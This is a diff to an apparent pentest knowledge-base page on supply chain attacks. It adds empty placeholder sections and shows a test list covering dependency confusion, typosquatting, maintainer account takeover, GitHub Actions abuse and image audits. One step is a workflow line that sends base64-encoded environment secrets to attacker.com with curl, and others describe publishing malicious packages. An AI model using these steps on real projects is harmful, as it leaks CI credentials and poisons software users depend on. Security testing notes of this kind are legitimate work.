@@ -1,4 +1,62 @@
-# Supply Chain Attack Techniques
+# Supply Chain Techniques
+
+> Tracked CVEs and techniques for this class. Updated via daily `refresh-latest` pipeline.
+
+_Last updated: — · Items: 0_
+
+---
+
+## What
+
+_Define the class, prerequisites, and typical finding shape. Fill with real content._
+_pending enrichment — baseline opener below_
+
+See items under ## Items for per-finding details.
+
+---
+
+## CVEs
+
+_No CVE-assigned items yet. Items below are pre-CVE or class-level findings._
+
+---
+
+## Probes
+
+_Grep, curl, nuclei probes for this class. Append as items arrive with real PoCs._
+_pending enrichment_
+
+---
+
+## PoCs
+
+_Public PoC links rolled up from items below._
+
+_No PoCs in items yet._
+
+---
+
+## Reproduction
+
+_Step-by-step repro steps per CVE. Populated as items arrive with enough detail._
+_pending enrichment_
+
+---
+
+## Defense
+
+_Patch guidance and detection rules. Populated from vendor advisories._
+_pending enrichment_
+
+---
+
+## References
+
+_Populated by daily refresh-latest pipeline._
+
+---
+
+## Items
 
 > Supply chain attacks — compromising software at the dependency, build, or distribution layer rather than the target application directly.
 
@@ -15,6 +73,7 @@
 ## Test Approach
 
 1. **Dependency confusion** — if target uses private package registry, register same name in public registry at higher version:
+
    ```
    # Check target's package.json/requirements.txt for internal package names
    # Register: attacker publishes `@company/internal-auth` on public npm at v99.0.0
@@ -22,22 +81,26 @@
    ```
 
 2. **Typosquatting probe** — check for common typos of high-value packages:
+
    ```
    # Target uses: requests, urllib3, boto3
    # Check: reqeusts, urlib3, bto3 on PyPI — register if unclaimed
    ```
 
 3. **CI/CD pipeline audit** — pull request from attacker fork can trigger Actions on push:
+
    ```yaml
    # Malicious workflow in forked PR
    - name: Exfil
      run: curl -d "$(env | base64)" https://attacker.com/env
    ```
+
    Check for `pull_request_target` trigger on public repos — inherits secrets.
 
 4. **Package account takeover** — check maintainer emails on npm/PyPI for abandoned domains; register domain, reset account, publish malicious version
 
 5. **GitHub Actions exfil via `pull_request_target`**:
+
    ```yaml
    on:
      pull_request_target:
@@ -50,12 +113,14 @@
    ```
 
 6. **Docker image audit** — check FROM base images for known-malicious or abandoned tags:
+
    ```
    docker history <image> --no-trunc
    # Trace all layers; check each base image hash against known-good
    ```
 
 7. **npm audit + outdated** — look for packages with known supply chain incidents:
+
    ```
    npm audit --json | jq '.vulnerabilities | to_entries[] | select(.value.severity=="critical")'
    ```
